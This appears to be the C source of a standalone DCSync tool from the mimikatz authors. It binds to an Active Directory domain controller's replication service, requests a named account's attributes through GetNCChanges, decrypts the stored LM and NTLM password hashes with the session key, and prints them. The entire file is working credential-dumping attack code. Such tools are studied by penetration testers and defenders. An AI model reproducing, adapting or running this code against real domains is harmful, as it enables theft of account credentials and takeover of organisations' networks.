/*	Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com / http://blog.gentilkiwi.com )
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "dcsync.h"

int wmain(int argc, wchar_t * argv[])
{
	RPC_BINDING_HANDLE hBinding;
	DRS_HANDLE hDrs = NULL;
	DSNAME dsName = {0};
	DRS_MSG_GETCHGREQ getChReq = {0};
	DWORD dwOutVersion = 0;
	DRS_MSG_GETCHGREPLY getChRep = {0};
	ULONG drsStatus;

	DWORD ret;
	LPCWSTR szUser, szDomain, szDc = NULL;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;

	kprintf(L"\n"
		L"  .#####.   DCSync 1.0\n"
		L" .## ^ ##.  /* * *\n"
		L" ## / \\ ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		L" ## \\ / ##   Vincent LE TOUX            ( vincent.letoux@gmail.com )\n"
		L" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		L"  '#####'    http://www.mysmartlogon.com                      * * */\n\n");	

	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
	{
		kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
		{
			kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
			if(!kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
			{
				ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
				if(ret == ERROR_SUCCESS)
					szDc = cInfo->DomainControllerName + 2;
				else PRINT_ERROR(L"[DC] DsGetDcName: %u\n", ret);
			}

			if(szDc)
			{
				kprintf(L"[DC] \'%s\' will be the main server\n\n", szDc);
				if(rpc_factory_create(szDc, RpcSecurityCallback, &hBinding))
				{
					if(rpc_factory_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, &dsName.Guid))
					{
						if(rpc_factory_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs))
						{
							getChReq.V8.pNC = &dsName;
							getChReq.V8.ulFlags = 0x00000030;
							getChReq.V8.cMaxObjects = 500;
							getChReq.V8.cMaxBytes = 0x00a00000;
							getChReq.V8.ulExtendedOp = 6;

							__try
							{
								drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
								if(drsStatus == 0)
								{
									if((dwOutVersion == 6) && (getChRep.V6.cNumObjects == 1))
										descrUser(&getChRep.V6.pObjects[0].Entinf.AttrBlock);
								}
								else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);

								IDL_DRSUnbind(&hDrs);
							}
							__except(  (RpcExceptionCode() != STATUS_ACCESS_VIOLATION) &&
								(RpcExceptionCode() != STATUS_DATATYPE_MISALIGNMENT) &&
								(RpcExceptionCode() != STATUS_PRIVILEGED_INSTRUCTION) &&
								(RpcExceptionCode() != STATUS_ILLEGAL_INSTRUCTION) &&
								(RpcExceptionCode() != STATUS_BREAKPOINT) &&
								(RpcExceptionCode() != STATUS_STACK_OVERFLOW) &&
								(RpcExceptionCode() != STATUS_IN_PAGE_ERROR) &&
								(RpcExceptionCode() != STATUS_ASSERTION_FAILURE) &&
								(RpcExceptionCode() != STATUS_STACK_BUFFER_OVERRUN) &&
								(RpcExceptionCode() != STATUS_GUARD_PAGE_VIOLATION)
								)
							{
								PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
							}
						}
					}
					rpc_factory_delete(&hBinding);
				}
			}
			if(cInfo)
				NetApiBufferFree(cInfo);
		}
		else PRINT_ERROR(L"Missing domain argument\n");
	}
	else PRINT_ERROR(L"Missing user argument\n");
	return 0;
}

SecPkgContext_SessionKey g_sKey = {0, NULL};
void RPC_ENTRY RpcSecurityCallback(_In_ void *Context)
{
	RPC_STATUS rpcStatus;
	SECURITY_STATUS secStatus;
	PCtxtHandle data = NULL;

	rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID *) &data);
	if(rpcStatus == RPC_S_OK)
	{
		if(g_sKey.SessionKey)
		{
			FreeContextBuffer(g_sKey.SessionKey);
			g_sKey.SessionKeyLength = 0;
			g_sKey.SessionKey = NULL;
		}
		secStatus = QueryContextAttributes((PCtxtHandle) data, SECPKG_ATTR_SESSION_KEY, (LPVOID) &g_sKey);
	}
}

PVOID findMonoAttr(ATTRBLOCK *attributes, ATTRTYP type, PVOID data, DWORD *size)
{
	PVOID ptr = NULL;
	DWORD i;
	ATTR *attribut;
	
	if(data)
		*(PVOID *)data = NULL;
	if(size)
		*size = 0;

	for(i = 0; i < attributes->attrCount; i++)
	{
		attribut = &attributes->pAttr[i];
		if(attribut->attrTyp == type)
		{
			if(attribut->AttrVal.valCount == 1)
			{
				ptr = attribut->AttrVal.pAVal[0].pVal;
				if(data)
					*(PVOID *)data = ptr;
				if(size)
					*size = attribut->AttrVal.pAVal[0].valLen;
			}
			break;
		}
	}
	return ptr;
}

void findPrintMonoAttr(LPCWSTR prefix, ATTRBLOCK *attributes, ATTRTYP type, BOOL newLine)
{
	PVOID ptr;
	DWORD sz;
	if(findMonoAttr(attributes, type, &ptr, &sz))
		kprintf(L"%s%.*s%s", prefix ? prefix : L"", sz / sizeof(wchar_t), ptr, newLine ? L"\n" : L"");
}

void descrUser(ATTRBLOCK *attributes)
{
	DWORD rid = 0;
	PBYTE encodedData;
	DWORD encodedDataSize;
	BYTE clearHash[LM_NTLM_HASH_LENGTH];
	PVOID data;

	findPrintMonoAttr(L"SAM Username         : ", attributes, ATT_SAM_ACCOUNT_NAME, TRUE);
	findPrintMonoAttr(L"User Principal Name  : ", attributes, ATT_USER_PRINCIPAL_NAME, TRUE);
	findPrintMonoAttr(L"Object RDN           : ", attributes, ATT_RDN, TRUE);

	if(findMonoAttr(attributes, ATT_SAM_ACCOUNT_TYPE, &data, NULL))
		kprintf(L"Account Type         : %08x\n", *(PDWORD) data);

	if(findMonoAttr(attributes, ATT_ACCOUNT_EXPIRES, &data, NULL))
	{
		kprintf(L"Account expiration   : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}

	if(findMonoAttr(attributes, ATT_PWD_LAST_SET, &data, NULL))
	{
		kprintf(L"Password last change : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		kprintf(L"\n");
	}

	if(findMonoAttr(attributes, ATT_OBJECT_SID, &data, NULL))
	{
		kprintf(L"Object Security ID   : ");
		kull_m_string_displaySID(data);
		kprintf(L"\n");
		rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - 1);
		kprintf(L"Object Relative ID   : %u\n", rid);

		kprintf(L"\nCredentials:\n");

		if(findMonoAttr(attributes, ATT_DBCS_PWD, &encodedData, &encodedDataSize))
		{
			kprintf(L"  LM:   ");
			if(decryptHash(encodedData, encodedDataSize, rid, clearHash))
				kull_m_string_wprintf_hex(clearHash, sizeof(clearHash), 0);
			kprintf(L"\n");
		}
		if(findMonoAttr(attributes, ATT_UNICODE_PWD, &encodedData, &encodedDataSize))
		{
			kprintf(L"  NTLM: ");
			if(decryptHash(encodedData, encodedDataSize, rid, clearHash))
				kull_m_string_wprintf_hex(clearHash, sizeof(clearHash), 0);
			kprintf(L"\n");
		}
	}
}

BOOL decryptHash(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, PBYTE data)
{
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER cryptoData, cryptoKey;

	MD5Init(&md5ctx);
	MD5Update(&md5ctx, g_sKey.SessionKey, g_sKey.SessionKeyLength);
	MD5Update(&md5ctx, encodedData, 16); // salt
	MD5Final(&md5ctx);

	cryptoData.Length = cryptoData.MaximumLength = encodedDataSize - 16; // salt size
	cryptoData.Buffer = encodedData + 16;// salt size
	cryptoKey.Length = cryptoKey.MaximumLength = MD5_DIGEST_LENGTH;
	cryptoKey.Buffer = md5ctx.digest;
	if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
	{
		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cryptoData.Buffer + 4, &rid, data));
		if(!status)
			PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
	}
	else PRINT_ERROR(L"RtlEncryptDecryptRC4");
	return status;
}